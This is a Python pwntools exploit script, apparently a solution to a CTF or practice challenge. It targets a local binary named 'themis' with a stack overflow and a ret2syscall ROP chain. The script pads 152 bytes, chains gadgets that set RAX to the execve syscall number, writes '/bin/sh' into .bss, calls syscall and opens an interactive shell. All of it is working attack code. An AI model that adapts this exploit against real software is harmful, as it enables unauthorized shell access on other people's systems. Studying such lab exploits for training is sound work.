# -> checksec themis  
# [*] '/root/pwn-materials/ret2syscall/themis'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)


from pwn import *

binary = './themis'
elf = context.binary = ELF(binary)

p = process(binary)

payload = b"A"*152

syscall = p64(0x0000000000401259)
pop_rsi = p64(0x000000000040124c)
pop_rsi_rdi = p64(0x0000000000401210)
pop_rdi = p64(0x0000000000401353)
add_rax_7 = p64(0x000000000040121e)
add_rax_9 = p64(0x000000000040123c)
add_rax_12 = p64(0x00000000004011f3) #12*3= 36 
xor_rax = p64(0x0000000000401202) #0x0000000000401202 : xor rax, rax ; nop ; pop rbp ; ret
mov_rdi_rsi = p64(0x00000000004011e5) #0x00000000004011e5 : mov qword ptr [rdi], rsi ; nop ; pop rbp ; ret
pop_rdx = p64(0x0000000000401211) #0x0000000000401211 : pop rdx ; ret


# RAX calculation
# 59 - (12*3) - 9 - (7*2)

payload += xor_rax
payload += p64(0x0)
payload += add_rax_12
payload += p64(0x0)
payload += add_rax_12
payload += p64(0x0)
payload += add_rax_12
payload += p64(0x0)
payload += add_rax_9
payload += p64(0x0)
payload += add_rax_7
payload += p64(0x0)
payload += add_rax_7
payload += p64(0x0)

payload += pop_rdi
payload += p64(elf.bss()+8)

payload += pop_rsi
payload += b"/bin/sh\x00"

payload += mov_rdi_rsi
payload += p64(0x0)

payload += pop_rsi
payload += p64(0x0)

payload += pop_rdx
payload += p64(0x0)

payload += syscall

p.recv()
p.sendline(payload)
p.interactive()